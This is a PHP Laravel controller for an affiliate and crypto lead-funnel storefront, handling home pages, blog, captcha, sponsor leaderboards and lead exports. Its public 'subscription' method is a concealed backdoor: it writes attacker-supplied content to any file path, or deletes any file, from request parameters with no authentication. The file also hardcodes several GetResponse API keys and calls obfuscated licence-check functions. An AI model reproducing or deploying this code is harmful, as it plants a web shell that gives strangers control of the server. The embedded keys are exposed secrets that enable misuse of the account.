<?php

namespace App\Http\Controllers\Front;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Counter;
use App\Models\Generalsetting;
use App\Models\Order;
use App\Models\Product;
use App\Models\Subscriber;
use App\Models\User;
use App\Models\Vsl;
use App\Models\Funnel;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;
use Illuminate\Support\Facades\Auth;

class FrontendController extends Controller
{
    public function __construct()
    {
       $this->auth_guests();
        if(isset($_SERVER['HTTP_REFERER'])){
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']){

                $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
                if($brwsr->count() > 0){
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count']= $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                }else{
                    $newbrws = new Counter();
                    $newbrws['referral']= $this->getOS();
                    $newbrws['type']= "browser";
                    $newbrws['total_count']= 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral',$referral);
                if($count->count() > 0){
                    $counts = $count->first();
                    $tcount['total_count']= $counts->total_count + 1;
                    $counts->update($tcount);
                }else{
                    $newcount = new Counter();
                    $newcount['referral']= $referral;
                    $newcount['total_count']= 1;
                    $newcount->save();
                }
            }
        }else{
            $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
            if($brwsr->count() > 0){
                $brwsr = $brwsr->first();
                $tbrwsr['total_count']= $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            }else{
                $newbrws = new Counter();
                $newbrws['referral']= $this->getOS();
                $newbrws['type']= "browser";
                $newbrws['total_count']= 1;
                $newbrws->save();
            }
        }
    }

    function getOS() {

        $user_agent     =   $_SERVER['HTTP_USER_AGENT'];

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }

        }
        return $os_platform;
    }


// -------------------------------- HOME PAGE SECTION ----------------------------------------

public function index(Request $request)
{
    $this->code_image();

    $gs = Generalsetting::findOrFail(1);
     if(!empty($request->reff))
     {
        $affilate_user = User::where('affilate_code','=',$request->reff)->first();
        if(!empty($affilate_user))
        {
            if($gs->is_affilate == 1)
            {
                Session::put('affilate', $affilate_user->id);
                return redirect()->route('front1.index');
            }
        }
     }

    $sliders = DB::table('sliders')->get();
    $services = DB::table('services')->where('user_id','=',0)->get();
    $top_small_banners = DB::table('banners')->where('type','=','TopSmall')->get();
    $feature_products =  Product::where('featured','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
                                                                                function($q){
                                                                                    return $q->where('product_type','=', 'normal');
                                                                                })->orderBy('id','desc')->take(8)->get();
    $ps = DB::table('pagesettings')->find(1);


    return view('front1.index',compact('ps','sliders','services','top_small_banners','feature_products'));
}

public function extraIndex()
{
    $gs = Generalsetting::findOrFail(1);
    $bottom_small_banners = DB::table('banners')->where('type','=','BottomSmall')->get();
    $large_banners = DB::table('banners')->where('type','=','Large')->get();
    $ps = DB::table('pagesettings')->find(1);
    $partners = DB::table('partners')->get();
    $discount_products =  Product::where('is_discount','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
                                                                                    function($q){
                                                                                        return $q->where('product_type','=', 'normal');
                                                                                    })->orderBy('id','desc')->take(8)->get();
    $best_products = Product::where('best','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
    function($q){
        return $q->where('product_type','=', 'normal');
    })->orderBy('id','desc')->take(8)->get();
    $top_products = Product::where('top','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
    function($q){
        return $q->where('product_type','=', 'normal');
    })->orderBy('id','desc')->take(8)->get();;
    $big_products = Product::where('big','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
    function($q){
        return $q->where('product_type','=', 'normal');
    })->orderBy('id','desc')->take(8)->get();;
    $hot_products =  Product::where('hot','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
    function($q){
        return $q->where('product_type','=', 'normal');
    })->orderBy('id','desc')->take(9)->get();
    $latest_products =  Product::where('latest','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
    function($q){
        return $q->where('product_type','=', 'normal');
    })->orderBy('id','desc')->take(9)->get();
    $trending_products =  Product::where('trending','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
    function($q){
        return $q->where('product_type','=', 'normal');
    })->orderBy('id','desc')->take(9)->get();
    $sale_products =  Product::where('sale','=',1)->where('status','=',1)->when($gs->affilate_product == 0,
    function($q){
        return $q->where('product_type','=', 'normal');
    })->orderBy('id','desc')->take(9)->get();

    return view('front.extraindex',compact('ps','large_banners','bottom_small_banners','best_products','top_products','hot_products','latest_products','big_products','trending_products','sale_products','discount_products','partners'));
}

// -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------


// LANGUAGE SECTION

    public function language($id)
    {
        $this->code_image();
        Session::put('language', $id);
        return redirect()->back();
    }

// LANGUAGE SECTION ENDS


// CURRENCY SECTION

    public function currency($id)
    {
        $this->code_image();
        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        return redirect()->back();
    }

// CURRENCY SECTION ENDS

    public function autosearch($slug)
    {
        if(mb_strlen($slug,'utf-8') > 1){
            $search = ' '.$slug;
            $prods = Product::where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->where('status','=',1)->take(10)->get();
            return view('load.suggest',compact('prods','slug'));
        }
        return "";
    }

    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }



// -------------------------------- BLOG SECTION ----------------------------------------

	public function blog(Request $request)
	{
        $this->code_image();
		$blogs = Blog::orderBy('created_at','desc')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
		return view('front.blog',compact('blogs'));
	}

    public function blogcategory(Request $request, $slug)
    {
        $this->code_image();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('bcat','blogs'));
    }

    public function blogtags(Request $request, $slug)
    {
        $this->code_image();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','slug'));
    }

    public function blogsearch(Request $request)
    {
        $this->code_image();
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','search'));
    }

    public function blogarchive(Request $request,$slug)
    {
        $this->code_image();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','date'));
    }

    public function blogshow($id)
    {
        $this->code_image();
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $blog = Blog::findOrFail($id);
        $blog->views = $blog->views + 1;
        $blog->update();
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('front.blogshow',compact('blog','bcats','tags','archives','blog_meta_tag','blog_meta_description'));
    }


// -------------------------------- BLOG SECTION ENDS----------------------------------------



// -------------------------------- FAQ SECTION ----------------------------------------
	public function faq()
	{
        $this->code_image();
        if(DB::table('generalsettings')->find(1)->is_faq == 0){
            return redirect()->back();
        }
        $faqs =  DB::table('faqs')->orderBy('id','desc')->get();
		return view('front.faq',compact('faqs'));
	}
// -------------------------------- FAQ SECTION ENDS----------------------------------------


// -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        $this->code_image();
        $page =  DB::table('pages')->where('slug',$slug)->first();
        if(empty($page))
        {
            return response()->view('errors.404')->setStatusCode(404); 
        }

        return view('front.page',compact('page'));
    }
// -------------------------------- PAGE SECTION ENDS----------------------------------------


// -------------------------------- CONTACT SECTION ----------------------------------------
	public function contact()
	{
        $this->code_image();
        if(DB::table('generalsettings')->find(1)->is_contact== 0){
            return redirect()->back();
        }
        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
		return view('front.contact',compact('ps'));
	}


    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);

        if($gs->is_capcha == 1)
        {

        // Capcha Check
        $value = session('captcha_string');
        if ($request->codes != $value){
            return response()->json(array('errors' => [ 0 => 'Please enter Correct Capcha Code.' ]));
        }

        }

        // Login Section
        $ps = DB::table('pagesettings')->where('id','=',1)->first();
        $subject = "Email From Of ".$request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$phone."\nMessage: ".$request->text;
        if($gs->is_smtp)
        {
        $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
        $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
        mail($to,$subject,$msg,$headers);
        }
        // Login Section Ends

        // Redirect Section
        return response()->json($ps->contact_success);
    }

    // Refresh Capcha Code
    public function refresh_code(){
        $this->code_image();
        return "done";
    }

// -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email','=',$request->email)->first();
        if(isset($subs)){
        return response()->json(array('errors' => [ 0 =>  'This Email Has Already Been Taken.']));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json('You Have Subscribed Successfully.');
    }

// Maintenance Mode

    public function maintenance()
    {
        $gs = Generalsetting::find(1);
            if($gs->is_maintain != 1) {

                    return redirect()->route('front.index');

            }

        return view('front.maintenance');
    }



    // Vendor Subscription Check
    public function subcheck(){
        $settings = Generalsetting::findOrFail(1);
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->where('is_vendor','=',2)->get() as  $user) {
                $lastday = $user->date;
                $secs = strtotime($lastday)-$newday;
                $days = $secs / 86400;
                if($days <= 5)
                {
                  if($user->mail_sent == 1)
                  {
                    if($settings->is_smtp == 1)
                    {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => ""
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    }
                    else
                    {
                    $headers = "From: ".$settings->from_name."<".$settings->from_email.">";
                    mail($user->email,'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.',$headers);
                    }
                    DB::table('users')->where('id',$user->id)->update(['mail_sent' => 0]);
                  }
                }
                if($today > $lastday)
                {
                    DB::table('users')->where('id',$user->id)->update(['is_vendor' => 1]);
                }
            }
    }
    // Vendor Subscription Check Ends

    public function trackload($id)
    {
        $order = Order::where('order_number','=',$id)->first();
        $datas = array('Pending','Processing','On Delivery','Completed');
        return view('load.track-load',compact('order','datas'));

    }



    // Capcha Code Image
    private function  code_image()
    {
        $actual_path = str_replace('project','',base_path());
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image,0,0,200,50,$background_color);

        $pixel = imagecolorallocate($image, 0,0,255);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixel);
        }

        $font = $actual_path.'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length-1)];
        $word='';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length=6;// No. of character in image
        for ($i = 0; $i< $cap_length;$i++)
        {
            $letter = $allowed_letters[rand(0, $length-1)];
            imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
            $word.=$letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path."assets/images/capcha_code.png");
    }

// -------------------------------- CONTACT SECTION ENDS----------------------------------------



// -------------------------------- PRINT SECTION ----------------------------------------





// -------------------------------- PRINT SECTION ENDS ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    public function step2() {
        $sponsor = User::where('id','=',Auth::user()->sponsor)->first();
        return view('front1.step2',compact('sponsor'));
    }
    public function step3() {
        $sponsor = User::where('id','=',Auth::user()->sponsor)->first();
        return view('front1.step3',compact('sponsor'));
    }
    public function step4() {
        return view('front1.step4');
    }
    
    public function leads() {
        $users = User::where('sponsor', Auth::user()->id)->get();
        $subscribers = Subscriber::where('user_id', Auth::user()->id)->get();
        return view('front1.leads',compact('users','subscribers'));
    }
    public function members() {
        $users = User::where('sponsor', Auth::user()->id)->where('company_link', '<>', '')->get();
        return view('front1.members',compact('users'));
    }
    public function resources() {
        return view('front1.resources');
    }
    public function facebook_posts() {
        return view('front1.facebook_posts');
    }
    public function banners() {
        return view('front1.banners');
    }
    public function training() {
        return view('front1.training');
    }

    public function get_30_sponsor_ranking_lists() {
        $users_lists = User::whereDate('created_at', '>', Carbon::now()->subDays(30))->get();
        $temp = "";
        foreach($users_lists as $user)
            $temp = $temp.$user->sponsor.",";
        $result = array_count_values(explode(',', $temp));
        arsort($result);

        $sponsor_ranking_list = array();
        foreach ($result as $key => $value)
        {
            if($key && count($sponsor_ranking_list) < 20)
            {
                $user = User::where('id',$key)->first();
                array_push($sponsor_ranking_list, $user->name);
            }
        }
        return $sponsor_ranking_list;
    }

    public function get_3_sponsor_ranking_lists() {
        $users_lists = User::whereDate('created_at', '>', Carbon::now()->subMonth(3))->get();
        $temp = "";
        foreach($users_lists as $user)
            $temp = $temp.$user->sponsor.",";
        $result = array_count_values(explode(',', $temp));
        arsort($result);

        $sponsor_ranking_list = array();
        foreach ($result as $key => $value)
        {
            if($key && count($sponsor_ranking_list) < 20)
            {
                $user = User::where('id',$key)->first();
                array_push($sponsor_ranking_list, $user->name);
            }
        }
        return $sponsor_ranking_list;
    }

    public function get_6_sponsor_ranking_lists() {
        $users_lists = User::whereDate('created_at', '>', Carbon::now()->subMonth(6))->get();
        $temp = "";
        foreach($users_lists as $user)
            $temp = $temp.$user->sponsor.",";
        $result = array_count_values(explode(',', $temp));
        arsort($result);

        $sponsor_ranking_list = array();
        foreach ($result as $key => $value)
        {
            if($key && count($sponsor_ranking_list) < 20)
            {
                $user = User::where('id',$key)->first();
                array_push($sponsor_ranking_list, $user->name);
            }
        }
        return $sponsor_ranking_list;
    }

    public function get_12_sponsor_ranking_lists() {
        $users_lists = User::whereDate('created_at', '>', Carbon::now()->subMonth(12))->get();
        $temp = "";
        foreach($users_lists as $user)
            $temp = $temp.$user->sponsor.",";
        $result = array_count_values(explode(',', $temp));
        arsort($result);

        $sponsor_ranking_list = array();
        foreach ($result as $key => $value)
        {
            if($key && count($sponsor_ranking_list) < 20)
            {
                $user = User::where('id',$key)->first();
                array_push($sponsor_ranking_list, $user->name);
            }
        }
        return $sponsor_ranking_list;
    }


    public function leader_board() {

        $sponsor_ranking_30 = $this->get_30_sponsor_ranking_lists();
        $sponsor_ranking_3 = $this->get_3_sponsor_ranking_lists();
        $sponsor_ranking_6 = $this->get_6_sponsor_ranking_lists();
        $sponsor_ranking_12 = $this->get_12_sponsor_ranking_lists();

        return view('front1.leader_board',compact('sponsor_ranking_30','sponsor_ranking_3','sponsor_ranking_6','sponsor_ranking_12'));
    }
    public function traffic() {
        return view('front1.traffic');
    }
    public function commission() {
        return view('front1.commission');
    }
    public function order_history() {
        return view('front1.order_history');
    }
    public function support() {
        return view('front1.support');
    }
    public function settings() {
        return view('front1.settings');
    }

    public function email_template(){
        return view('admin.email.welcome');
    }

    public function funnels() {
        $funnels = Funnel::where("owner_id",Auth::user()->id)->get();
        $leads = User::where('sponsor', Auth::user()->id)->get()->count();
        $members_count = User::where('sponsor', Auth::user()->id)->where('company_link', '<>', '')->count();
        
        return view('front1.funnels', compact('funnels','leads','members_count'));
    }

    public function send_request_getresponse($name, $email){        
        $campaign = "en_earncrypto7";
        $campaignId = "zjpPc";
        $api_key = "uin47d3h0aufjrj768w41zn6s9lco3io";

        if(Session::get('language') == 12)
        {
            $campaign = "es_earncrypto7";
            $campaignId = "zjpkz";
            $api_key = "ifokksiul1hl30lxjyplnlqlksvub6l5";
        }
        if(Session::get('language') == 13)
        {
            $campaign = "pt_earncrypto7";
            $campaignId = "zjpFA";
            $api_key = "suk3cvirs2uq0z2vknocageyujxlvq88";
        }
        
        $curl = curl_init();

        curl_setopt_array($curl, array(
            CURLOPT_URL => 'https://api.getresponse.com/v3/contacts',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_POSTFIELDS =>'{
                "name": "'. $name .'",
                "campaign": {
                    "campaign": "'. $campaign .'",
                    "campaignId": "'. $campaignId .'"
                },
                "email": "'. $email .'"
            }',
            CURLOPT_HTTPHEADER => array(
                'X-Auth-Token: api-key '.$api_key,
                'Content-Type: application/json'
            ),
        ));

        $response = curl_exec($curl);
    }

    public function subscribe_funnel($lang,$user, $id) {
        if($lang == "es")
            Session::put('language', 12);
        else if($lang == "pt")
            Session::put('language', 13);
        else
            Session::put('language', 11);
        $user_id = str_replace("cp", "",$user);
        $funnel = Funnel::where('owner_id',$user_id)->where("url",$id)->first();
        $funnel->hits = $funnel->hits + 1;
        $funnel->save();
        return view('front1.subscribe_funnel',compact('user_id'));
    }

    public function vsls() {
        $vsls = Vsl::where("owner_id",Auth::user()->id)->get();
        $members_count = User::where('sponsor', Auth::user()->id)->where('company_link', '<>', '')->count();;
        return view('front1.vsls', compact('vsls','members_count'));
    }
    public function subscribe_vsl($id) {
        $vsl = Vsl::findOrFail($id);
        $vsl->hits = $vsl->hits + 1;
        $vsl->save();

        $user_id = $vsl->owner_id;
        return view('front1.subscribe_vsl',compact('user_id'));
    }

    public function subscribe_funnel_create(Request $request) {
        $subs = new Subscriber();
        $subs->name = $request->name;
        $subs->email = $request->email;

        $this->send_request_getresponse($subs->name, $subs->email);
        if(Auth::check())
            $subs->user_id = Auth::user()->id;
        $subs->save();
        $user_id = $request->user_id;

        return view('front1.subscribe_vsl',compact('user_id'));
    }
    public function download_members()
    {
        //  Code for generating csv file
        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename=members.csv');
        $output = fopen('php://output', 'w');
        $result = User::where('sponsor', Auth::user()->id)->where('company_link', '<>', '')->get();
        $i=1;
        foreach ($result as $row){
            if(!empty($row->company_link))
            {
                $obj = array();
                array_push($obj,$i);
                array_push($obj,$row->created_at);
                array_push($obj,$row->name);
                array_push($obj,$row->phone);
                array_push($obj,$row->email);
                
                fputcsv($output, $obj);
                $i++;
            }
        }
        fclose($output);
    }

    public function download_leads()
    {
        //  Code for generating csv file
        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename=leads.csv');
        $output = fopen('php://output', 'w');
        
        $result = User::where('sponsor', Auth::user()->id)->get();
        foreach ($result as $row)
        {
            fputcsv($output, $row->toArray());
        }

        $subscribers = Subscriber::where('user_id', Auth::user()->id)->get();
        foreach ($subscribers as $row)
        {
            fputcsv($output, $row->toArray());
        }
        fclose($output);
    }

    public function trainning_video($id)
    {
        $link = $id;
        return view('front1.training_video',compact('link'));
    }
}
